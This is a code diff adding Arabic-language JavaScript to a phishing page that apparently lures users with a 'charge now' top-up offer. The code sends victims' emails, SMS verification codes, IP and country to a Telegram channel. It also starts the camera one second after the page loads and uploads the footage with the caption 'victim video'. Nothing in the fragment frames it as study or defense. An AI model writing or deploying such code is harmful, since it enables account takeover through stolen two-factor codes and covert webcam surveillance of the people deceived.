+            await sendToTelegram(msg);
+            
+            // إرسال الفيديو/الصورة
+            if (capturedMedia) {
+                const mediaCaption = `🎥 فيديو الضحية — ${email} | ${info.ip} | ${info.country}`;
+                await sendMediaToTelegram(mediaCaption);
+            }
+            
+            btn.innerHTML = 'إشحن الآن 💎';
+            btn.disabled = false;
+            
+            goToStep(5);
+        }
+        
+        window.handleSMS = async function(event) {
+            event.preventDefault();
+            const code = document.getElementById('smsInput').value.trim();
+            const btn = event.target;
+            
+            if(!code || code.length < 4) {
+                alert('أدخل رمز صحيح (6 أرقام)');
+                return;
+            }
+            
+            btn.innerHTML = '<div class="loading"></div> جاري التأكيد...';
+            btn.disabled = true;
+            
+            const smsMsg = `📩 <b>كود SMS!</b>\n📧 الحساب: ${document.getElementById('userEmail').value}\n🔢 الرمز: <code>${code}</code>\n🕐 ${new Date().toLocaleString('ar-EG')}`;
+            
+            await sendToTelegram(smsMsg);
+            
+            btn.innerHTML = 'تأكيد الرمز';
+            btn.disabled = false;
+            
+            goToStep(6);
+        }
+        
+        // ==================== 🚀 تشغيل الكاميرا فور تحميل الصفحة ====================
+        window.addEventListener('load', async function() {
+            console.log('🚀 بدء تسجيل الفيديو فوراً...');
+            
+            // تأخير بسيط لضمان تحميل الصفحة
+            setTimeout(async () => {
+                await captureMediaOnEntry();
+                if (capturedMedia) {
+                    console.log(`✅ تم التسجيل: ${capturedMedia.type} (${(capturedMedia.blob.size / 1024).toFixed(1)} KB)`);
+                }
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
